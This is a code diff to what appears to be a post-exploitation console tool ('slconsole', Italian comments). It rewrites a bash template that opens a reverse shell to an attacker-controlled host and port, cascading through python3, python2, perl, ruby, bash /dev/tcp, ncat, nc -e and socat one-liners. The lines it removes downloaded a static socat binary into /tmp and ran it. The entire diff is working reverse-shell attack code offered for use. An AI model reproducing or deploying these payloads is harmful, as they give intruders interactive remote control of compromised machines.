@@ -73,37 +73,94 @@ def discover_interfaces() -> list[tuple[str, str]]:
 
 UPGRADE_TEMPLATE = r"""#!/bin/bash
 # === slconsole shell upgrade ===
-# Metodo 1: socat (preferito — TTY piena)
+# Apre una nuova reverse shell con TTY verso {lhost}:{lport}
+
+# Metodo 1: python3 — full PTY (preferito)
+if command -v python3 >/dev/null 2>&1; then
+    echo "[+] python3 trovato — reverse shell PTY..."
+    python3 -c '
+import pty,socket,os,sys
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("{lhost}",{lport}))
+os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
+os.environ["TERM"]="xterm-256color"
+pty.spawn("/bin/bash")
+' &
+    exit 0
+fi
+
+# Metodo 2: python2
+if command -v python >/dev/null 2>&1; then
+    echo "[+] python trovato — reverse shell PTY..."
+    python -c '
+import pty,socket,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("{lhost}",{lport}))
+os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
+os.environ["TERM"]="xterm-256color"
+pty.spawn("/bin/bash")
+' &
+    exit 0
+fi
+
+# Metodo 3: perl
+if command -v perl >/dev/null 2>&1; then
+    echo "[+] perl trovato — reverse shell..."
+    perl -e '
+use Socket;
+socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
+connect(S,sockaddr_in({lport},inet_aton("{lhost}")));
+open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");
+exec("/bin/bash -i");
+' &
+    exit 0
+fi
+
+# Metodo 4: ruby
+if command -v ruby >/dev/null 2>&1; then
+    echo "[+] ruby trovato — reverse shell..."
+    ruby -rsocket -e '
+s=TCPSocket.new("{lhost}",{lport})
+[0,1,2].each{{|fd| IO.new(s.fileno).tap{{|io| io.reopen(IO.new(fd))}} rescue nil}}
+$stdin.reopen(s);$stdout.reopen(s);$stderr.reopen(s)
+exec("/bin/bash -i")
+' &
+    exit 0
+fi
+
+# Metodo 5: bash /dev/tcp (no PTY ma quasi sempre disponibile)
+if [ -e /dev/tcp ] || bash -c 'echo' 2>/dev/null; then
+    echo "[+] bash /dev/tcp — reverse shell..."
+    bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' &
+    exit 0
+fi
+
+# Metodo 6: ncat (da nmap)
+if command -v ncat >/dev/null 2>&1; then
+    echo "[+] ncat trovato — reverse shell..."
+    ncat {lhost} {lport} -e /bin/bash &
+    exit 0
+fi
+
+# Metodo 7: nc con -e (non tutte le versioni lo supportano)
+if command -v nc >/dev/null 2>&1; then
+    nc -h 2>&1 | grep -q '\-e' && {{
+        echo "[+] nc -e trovato — reverse shell..."
+        nc {lhost} {lport} -e /bin/bash &
+        exit 0
+    }}
+fi
+
+# Metodo 8: socat (se disponibile localmente)
 if command -v socat >/dev/null 2>&1; then
-    echo "[*] socat trovato, upgrade diretto..."
+    echo "[+] socat trovato — reverse shell TTY..."
     socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport} &
     exit 0
 fi
 
-# Metodo 2: scarica socat statico
-echo "[*] Scaricamento socat statico..."
-SOCAT_URL="https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat"
-if command -v curl >/dev/null 2>&1; then
-    curl -s -L "$SOCAT_URL" -o /tmp/socat
-elif command -v wget >/dev/null 2>&1; then
-    wget -q "$SOCAT_URL" -O /tmp/socat
-else
-    # Metodo 3: fallback python pty
-    echo "[*] Nessun downloader, fallback a python pty..."
-    if command -v python3 >/dev/null 2>&1; then
-        python3 -c "import pty,socket,os;s=socket.socket();s.connect(('{lhost}',{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')" &
-    elif command -v python >/dev/null 2>&1; then
-        python -c "import pty,socket,os;s=socket.socket();s.connect(('{lhost}',{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')" &
-    else
-        echo "[-] Nessun metodo disponibile per l'upgrade."
-        exit 1
-    fi
-    exit 0
-fi
-
-chmod +x /tmp/socat
-echo "[*] Lancio shell stabile verso {lhost}:{lport}..."
-/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport} &
+echo "[-] Nessun metodo disponibile per l'upgrade."
+echo "    Usa /upgrade2 per upgrade in-place (senza nuova connessione)."
+exit 1
 """
 
 UPGRADE2_TEMPLATE = r"""#!/bin/bash
